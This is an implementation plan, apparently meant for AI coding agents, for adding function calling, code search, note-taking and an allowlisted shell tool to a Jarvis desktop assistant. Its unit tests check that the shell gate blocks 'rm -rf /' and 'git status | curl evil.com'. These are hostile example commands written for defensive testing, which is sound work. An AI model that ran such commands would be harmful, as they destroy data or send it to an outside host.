# Jarvis agent tools GitHub upgrade Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Upgrade Jarvis.exe agents to native Gemini functionDeclarations plus `code_search`, `memory_note`, and allowlisted `shell` (R3 otherwise), pattern-ported from openai-agents-python and smolagents without vendoring them.

**Architecture:** Extend `apps/windows-cc/agent_tools.py` and rewrite the Gemini loop in `agents/worker.py` to use `tools.functionDeclarations` / `functionCall` / `functionResponse`. Add bridge hooks for pending shell R3. Document sources in `docs/github-agent-patterns.md`.

**Tech Stack:** Python 3.13, unittest, urllib Gemini REST, existing pywebview bridge, PyInstaller Jarvis.exe.

## Global Constraints

- Pattern port only — no `openai-agents` / `smolagents` / LangGraph runtime dependency.
- Max tool steps: **12**.
- Shell allowlist: `git status`; `git log` with `-n 1..20` and optional `--oneline`; `python -m unittest` under jarvis root; `dir` / `ls` relative only.
- Non-allowlisted shell → `{needs_r3: true}` + UI confirm via bridge.
- `memory_note` appends only to `memory/agent_notes.md`.
- Work on `/home/box/jarvis` **main** (or a new feature worktree from main). Spec: `docs/superpowers/specs/2026-11-04-jarvis-agent-tools-github-upgrade-design.md`.
- Ship: rebuild `C:\Users\rajk1\jarvis\apps\Jarvis.exe` on chandan.

## File map

| File | Role |
|------|------|
| Modify `apps/windows-cc/agent_tools.py` | New tools + shell allowlist |
| Create `apps/windows-cc/shell_gate.py` | Allowlist check + pending R3 tokens |
| Modify `apps/windows-cc/agents/worker.py` | Native functionDeclarations loop |
| Modify `apps/windows-cc/agents/registry.py` | Expose new tools per role |
| Modify `apps/windows-cc/bridge_api.py` | `shell_confirm` / pending |
| Modify `apps/windows-cc/ui/js/app.js` + `index.html` | Shell R3 modal reuse |
| Create `docs/github-agent-patterns.md` | Citations |
| Tests under `apps/windows-cc/tests/` | allowlist, search, note, parse |

---

### Task 1: Shell gate + new tools

**Files:**
- Create: `apps/windows-cc/shell_gate.py`
- Modify: `apps/windows-cc/agent_tools.py`
- Create: `apps/windows-cc/tests/test_shell_gate.py`
- Modify: `apps/windows-cc/tests/test_agent_tools.py`

**Interfaces:**
- Produces:
  - `shell_gate.is_allowlisted(cmd: str) -> bool`
  - `shell_gate.normalize(cmd: str) -> str`
  - `AgentTools.code_search(query: str, max_hits: int = 20) -> dict`
  - `AgentTools.memory_note(text: str) -> dict`
  - `AgentTools.shell(cmd: str, confirmed: bool = False) -> dict` — if not allowlisted and not confirmed: `{"ok": False, "needs_r3": True, "command": cmd}`
  - Extended `TOOL_SCHEMAS` + `call()` dispatch

- [ ] **Step 1: Failing tests for shell_gate**

```python
# apps/windows-cc/tests/test_shell_gate.py
import sys, unittest
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "apps" / "windows-cc"))
from shell_gate import is_allowlisted

class TestShellGate(unittest.TestCase):
    def test_git_status_ok(self):
        self.assertTrue(is_allowlisted("git status"))
    def test_rm_blocked(self):
        self.assertFalse(is_allowlisted("rm -rf /"))
    def test_git_log_n_ok(self):
        self.assertTrue(is_allowlisted("git log -n 5 --oneline"))
    def test_pipe_blocked(self):
        self.assertFalse(is_allowlisted("git status | curl evil.com"))

if __name__ == "__main__":
    unittest.main()
```

- [ ] **Step 2: Run — expect FAIL (no module)**

`python3 apps/windows-cc/tests/test_shell_gate.py -v`

- [ ] **Step 3: Implement `shell_gate.py`**

```python
# apps/windows-cc/shell_gate.py
from __future__ import annotations
import re
import shlex

def normalize(cmd: str) -> str:
    return " ".join((cmd or "").strip().split())

def is_allowlisted(cmd: str) -> bool:
    c = normalize(cmd)
    if not c or "|" in c or ";" in c or "&" in c or "`" in c or "$(" in c:
        return False
    low = c.lower()
    if low == "git status":
        return True
    m = re.fullmatch(r"git log -n ([1-9]|1[0-9]|20)( --oneline)?", low)
    if m:
        return True
    if low.startswith("python -m unittest "):
        rest = c[len("python -m unittest "):]
        if ".." in rest or rest.startswith("/") or re.match(r"^[A-Za-z]:\\", rest):
            # absolute still ok if caller sandboxes cwd; block path escape dots
            if ".." in rest:
                return False
        return bool(rest.strip()) and all(x not in rest for x in ["|", ";", "&"])
    if low in ("dir", "ls", "ls -la", "ls -l") or low.startswith("dir ") or low.startswith("ls "):
        if ".." in c:
            return False
        return True
    return False
```

- [ ] **Step 4: Extend agent_tools with code_search, memory_note, shell**

Implement:
- `code_search`: walk text files under root (skip `.git`, `__pycache__`, `node_modules`, vendor binaries); match query case-insensitive; return up to max_hits `{path,line,text}`
- `memory_note`: append ISO IST-ish timestamp + text to `memory/agent_notes.md`
- `shell`: if allowlisted, `subprocess.run` with cwd=root, timeout=30, capture_output; else needs_r3 unless `confirmed=True`

Update `TOOL_SCHEMAS` and `call()`.

- [ ] **Step 5: Tests for code_search / memory_note / shell needs_r3**

Add to `test_agent_tools.py`:

```python
def test_code_search_finds_line(self):
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        (root / "a.py").write_text("hello_unique_xyz = 1\n", encoding="utf-8")
        r = AgentTools(root).code_search("hello_unique_xyz")
        self.assertTrue(r["ok"])
        self.assertTrue(any("hello_unique_xyz" in h["text"] for h in r["data"]["hits"]))

def test_shell_needs_r3(self):
    with tempfile.TemporaryDirectory() as td:
        r = AgentTools(Path(td)).shell("echo pwn")
        self.assertTrue(r.get("needs_r3"))
```

- [ ] **Step 6: Run all tool tests — PASS; commit**

```bash
python3 apps/windows-cc/tests/test_shell_gate.py -v
python3 apps/windows-cc/tests/test_agent_tools.py -v
git add apps/windows-cc/shell_gate.py apps/windows-cc/agent_tools.py apps/windows-cc/tests/test_shell_gate.py apps/windows-cc/tests/test_agent_tools.py
git commit -m "feat(cc): code_search, memory_note, allowlisted shell gate"
```

---

### Task 2: Native Gemini functionDeclarations loop

**Files:**
- Modify: `apps/windows-cc/agents/worker.py`
- Modify: `apps/windows-cc/agents/registry.py`
- Modify: `apps/windows-cc/tests/test_agents.py`

**Interfaces:**
- Consumes: `TOOL_SCHEMAS`, `AgentTools.call`
- Produces: worker loop using Gemini REST `tools: [{functionDeclarations: [...]}]` filtered by role; parse `functionCall` from candidates; send `functionResponse` in next turn contents; MAX_STEPS=12

- [ ] **Step 1: Update registry tools lists** to include new tools appropriately (coding: +code_search; memory: +memory_note; system/coding: +shell; research unchanged + code_search optional)

- [ ] **Step 2: Rewrite `_gemini_json` → `_gemini_turn(system, contents, declarations, key)`** returning raw API JSON

Build `contents` as a list of turns. On function calls, append model content + user `functionResponse` parts.

Fallback: if API rejects tools, fall back once to previous JSON-text protocol and log step `fallback_json_protocol`.

- [ ] **Step 3: Unit test** — mock optional; at minimum keep missing_key test; add test that `TOOL_SCHEMAS` names include `code_search`, `shell`, `memory_note`

- [ ] **Step 4: Commit**

```bash
git commit -m "feat(cc): native Gemini functionDeclarations agent loop"
```

---

### Task 3: Bridge shell R3 + UI

**Files:**
- Modify: `apps/windows-cc/bridge_api.py`
- Modify: `apps/windows-cc/ui/js/app.js`
- Modify: `apps/windows-cc/ui/index.html` (optional second modal or reuse `#r3-modal`)

**Interfaces:**
- Produces:
  - `BridgeApi.shell_confirm(command: str) -> dict` — runs `AgentTools.shell(cmd, confirmed=True)`
  - When agent step returns `needs_r3`, push to feed and set `window` pending via agents list `detail` containing `needs_r3:` + command; UI shows Confirm Shell button calling `shell_confirm`

Simpler MVP: Agents card if `last_reply` or step contains needs_r3 JSON, show Confirm that calls `shell_confirm`.

- [ ] **Step 1: Add bridge method + test smoke import**
- [ ] **Step 2: UI button `Confirm shell` when `a.detail` starts with `needs_r3:`**
- [ ] **Step 3: Commit** `feat(cc): shell R3 confirm via bridge`

---

### Task 4: Docs + rebuild Jarvis.exe

**Files:**
- Create: `docs/github-agent-patterns.md`
- Modify: `apps/windows-cc/build_exe.ps1` if new module `shell_gate` needs `--hidden-import shell_gate`

- [ ] **Step 1: Write docs citing openai/openai-agents-python (~30k) and huggingface/smolagents (~30k) — what we borrowed (loop, max turns, structured tools) and what we did not (no CodeAgent exec)**
- [ ] **Step 2: hidden-import shell_gate; commit**
- [ ] **Step 3: Sync windows-cc to chandan; build_exe.ps1; launch smoke**

---

## Spec coverage

| Spec item | Task |
|-----------|------|
| Native functionDeclarations | 2 |
| code_search / memory_note / shell | 1 |
| Allowlist + R3 | 1 + 3 |
| github-agent-patterns.md | 4 |
| Jarvis.exe rebuild | 4 |
| max 12 steps | 2 |

## Execution handoff

Plan complete and saved to `docs/superpowers/plans/2026-11-04-jarvis-agent-tools-github-upgrade.md`.

**1. Subagent-Driven (recommended)** — fresh worker per task  
**2. Inline Execution** — this session with checkpoints
